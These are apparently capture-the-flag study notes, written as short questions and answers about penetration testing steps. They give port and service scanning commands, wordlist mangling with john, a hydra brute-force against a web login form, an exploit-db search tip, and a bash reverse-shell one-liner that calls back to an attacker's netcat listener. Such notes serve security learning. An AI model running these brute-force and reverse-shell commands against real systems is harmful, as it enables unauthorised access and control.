# Science/Med Bay

### How do you list all ports with extended information including UID and timers?
```
netstat -atunelop
```

### Given a port number, how do you find the associated service and its version?
```
nmap localhost -p 54261 -sC -sV
# -sC script scan
# -SV version scan
```

### How do you build a naive wordlist with mangled variation with john?
```
john --wordlist:/tmp/words.txt --rules --stdout
```
It might be a good idea to attempt the same variation for a username list as well

### Using a names list and a passwords list, how can you attempt to find a user login for a web page?
```
hydra -l ash -P /tmp/ash_passwords.txt 127.0.0.1 http-post-form "/interface/main/main_screen.php?auth=login&site=default:authProvider=Default&new_login_session_management=1&authUser=^USER^&clearPass=^PASS^&languageChoice=1:error" -s 54261 -v -V
```

### If you find the software and version of a web app, how can you find out how to exploit it?
Do an Internet search for `site:exploit-db.com <software> <version>`

### What is a script to open a reverse-shell with netcat?
```
# on vulnerable machine:
bash -i >& /dev/tcp/<ip address>/<port> 0>&1 
# on attacker machine:
nc -l -p <port>
```
